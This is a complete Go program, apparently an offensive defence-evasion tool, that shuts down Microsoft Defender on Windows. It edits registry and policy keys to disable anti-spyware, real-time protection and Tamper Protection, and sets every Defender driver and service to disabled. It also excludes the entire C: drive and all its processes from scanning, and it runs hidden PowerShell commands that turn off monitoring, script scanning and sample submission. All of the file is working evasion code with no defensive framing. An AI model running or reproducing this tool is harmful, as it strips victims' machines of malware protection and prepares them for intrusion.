package main

import (
	"fmt"
	"log"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func runPowerShell(cmd string) ([]byte, error) {
	run := exec.Command("powershell.exe", cmd)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := run.Output()
	return output, err
}

func disableFromRegs() {
	var regDefendPath = "SOFTWARE\\Microsoft\\Windows Defender"
	var realTimeKeys = []string{
		"SpyNetReporting",
		"SubmitSamplesConsent"}

	openWDKey, err := registry.OpenKey(registry.LOCAL_MACHINE, regDefendPath, registry.ALL_ACCESS)
	defer openWDKey.Close()
	if err != nil {
		fmt.Println("[x]Error opening Windows Defender Key: " + err.Error())
	} else {
		fmt.Print("[*]Disable Anti Spyware ")
		err = openWDKey.SetDWordValue("DisableAntiSpyware", 1)
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}

	openRDPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPath, "Real-Time Protection"), registry.ALL_ACCESS)
	defer openRDPKey.Close()
	if err != nil {
		fmt.Println("[x]Error opening Real-Time Protection key: " + err.Error())
	} else {
		for i := range realTimeKeys {
			fmt.Print("[*]Disable " + realTimeKeys[i] + " in Reat-Time Protection ")
			err = openRDPKey.SetDWordValue(realTimeKeys[i], 0)
			if err != nil {
				fmt.Println(" .. ERR:" + err.Error())
			} else {
				fmt.Println(" .. Done")
			}
		}
	}

	openFTKey, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPath, "Features"), registry.ALL_ACCESS)
	defer openFTKey.Close()
	if err != nil {
		fmt.Println("[x]Error opening Features Key: " + err.Error())
	} else {
		fmt.Print("[*]Disable Tamper Protection ")
		err = openFTKey.SetDWordValue("TamperProtection", 4)
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}
}

func disableFromPolicy() {
	var regDefendPolicyPath = "SOFTWARE\\Policies\\Microsoft\\Windows Defender"
	var realTimePolicyKeys = []string{
		"DisableBehaviorMonitoring",
		"DisableOnAccessProtection",
		"DisableScanOnRealtimeEnable"}

	openWDPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, regDefendPolicyPath, registry.ALL_ACCESS)
	defer openWDPKey.Close()
	if err != nil {
		log.Fatal("[x]Error opening Windows Defender Policies key: ", err)
	} else {
		fmt.Print("[*]Disable Anti Spyware Policy ")
		err = openWDPKey.SetDWordValue("DisableAntiSpyware", 1)
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}

	readRTPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPolicyPath, "Real-Time Protection"), registry.ENUMERATE_SUB_KEYS)
	defer readRTPKey.Close()

	if err != nil {
		if err == registry.ErrNotExist {
			if _, _, err := registry.CreateKey(openWDPKey, "Real-Time Protection", registry.CREATE_SUB_KEY); err != nil {
				log.Fatal("[x]Error unable to create Real-Time Protection Subkey: ", err)
			}
		} else {
			log.Fatal("[x]Error opening Real-Time Protection Policy key: ", err)
		}
	}

	openRTPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPolicyPath, "Real-Time Protection"), registry.ALL_ACCESS)
	defer openRTPKey.Close()

	for i := range realTimePolicyKeys {
		fmt.Print("[*]Disable " + realTimePolicyKeys[i] + " in Real-Time Protection Registry Policy ")
		err = openRTPKey.SetDWordValue(realTimePolicyKeys[i], 1)
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}
}

func disableDriversServices() {

	var regSvcPath = "SYSTEM\\CurrentControlSet\\Services"
	var defenderDrvs = []string{
		"mpsdrv",                //Windows Defender Firewall Authorization Driver
		"mpssvc",                //Windows Defender Firewall
		"Sense",                 //Windows Defender Advanced Threat Protection Service
		"WdBoot",                //Microsoft Defender Antivirus Boot Driver
		"WdFilter",              //Microsoft Defender Antivirus Mini-Filter Driver
		"WdNisDrv",              //Microsoft Defender Antivirus Network Inspection System Driver
		"WdNisSvc",              //Microsoft Defender Antivirus Network Inspection Service
		"WinDefend",             //Microsoft Defender Antivirus Service
		"SecurityHealthService", //Windows Security Service
		"wscsvc"}                //Security Center

	for i := range defenderDrvs {
		regCurrentKey := filepath.Join(regSvcPath, defenderDrvs[i])
		openSvcKey, err := registry.OpenKey(registry.LOCAL_MACHINE, regCurrentKey, registry.ALL_ACCESS)
		defer openSvcKey.Close()
		if err != nil {
			log.Fatal("[x]Error opening "+defenderDrvs[i]+" key: ", err)
		} else {
			fmt.Print("[*]Disable " + defenderDrvs[i] + " driver service key ")
			err = openSvcKey.SetDWordValue("Start", 4)
			if err != nil {
				fmt.Println(".. ERR:" + err.Error())
			} else {
				fmt.Println(".. Done")
			}
		}
	}
}

func addDriveExclusion() {
	fmt.Print("[*]Check if C: drive excluded ")
	openExcPathKey, err := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", registry.QUERY_VALUE)
	defer openExcPathKey.Close()

	if err != nil {
		log.Fatal("[x]Error unable to query exclusions key: ", err)
	} else {
		if _, _, err = openExcPathKey.GetIntegerValue("C:\\"); err == registry.ErrNotExist {
			_, err = runPowerShell(`Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue`)
			if err != nil {
				fmt.Println(".. ERR:" + err.Error())
			} else {
				fmt.Println(".. Done")
			}
		}
	}

	fmt.Print("[*]Check if C: processes are excluded ")

	openExcProcKey, err := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", registry.QUERY_VALUE)
	defer openExcProcKey.Close()

	if err != nil {
		log.Fatal("[x]Error unable to query processes exclusions: ", err)
	} else {
		if _, _, err = openExcProcKey.GetIntegerValue("C:\\*"); err == registry.ErrNotExist {
			_, err = runPowerShell(`Add-MpPreference -ExclusionProcess "C:\*" -ErrorAction SilentlyContinue`)
			if err != nil {
				fmt.Println(".. ERR:" + err.Error())
			} else {
				fmt.Println(".. Done")
			}
		}
	}
}

func disableScanEngine() {

	var mpEngines = []string{
		"DisableArchiveScanning",
		"DisableBehaviorMonitoring",
		"DisableCatchupQuickScan",
		"DisableCatchupFullScan",
		"DisableInboundConnectionFiltering",
		"DisableIntrusionPreventionSystem",
		"DisablePrivacyMode",
		"SignatureDisableUpdateOnStartupWithoutEngine",
		"DisableIOAVProtection",
		"DisableRemovableDriveScanning",
		"DisableBlockAtFirstSeen",
		"DisableScanningMappedNetworkDrivesForFullScan",
		"DisableScanningNetworkFiles",
		"DisableScriptScanning",
		"DisableRealtimeMonitoring"}

	var mpEngines2 = []string{
		"HighThreatDefaultAction",
		"ModerateThreatDefaultAction",
		"SevereThreatDefaultAction"}

	for i := range mpEngines {
		fmt.Print("[*]Set " + mpEngines[i] + " to true ")
		_, err := runPowerShell("Set-MpPreference -" + mpEngines[i] + " $true -ErrorAction SilentlyContinue")
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}

	for i := range mpEngines2 {
		fmt.Print("[*]Disable " + mpEngines2[i] + " ")
		_, err := runPowerShell("Set-MpPreference -" + mpEngines2[i] + " 6 -Force -ErrorAction SilentlyContinue")
		if err != nil {
			fmt.Println(".. ERR:" + err.Error())
		} else {
			fmt.Println(".. Done")
		}
	}

	fmt.Print("[*]Disable Sample Submission ")
	_, err := runPowerShell("Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue")
	if err != nil {
		fmt.Println(".. ERR:" + err.Error())
	} else {
		fmt.Println(".. Done")
	}

	fmt.Print("[*]Disable Maps Reporting ")
	_, err = runPowerShell("Set-MpPreference -MAPSReporting 0")
	if err != nil {
		fmt.Println(".. ERR:" + err.Error())
	} else {
		fmt.Println(".. Done")
	}
}

func main() {
	log.Println("[+]Initiating Windows defender shutdown!")
	disableDriversServices()
	disableFromRegs()
	disableFromPolicy()
	addDriveExclusion()
	disableScanEngine()
}
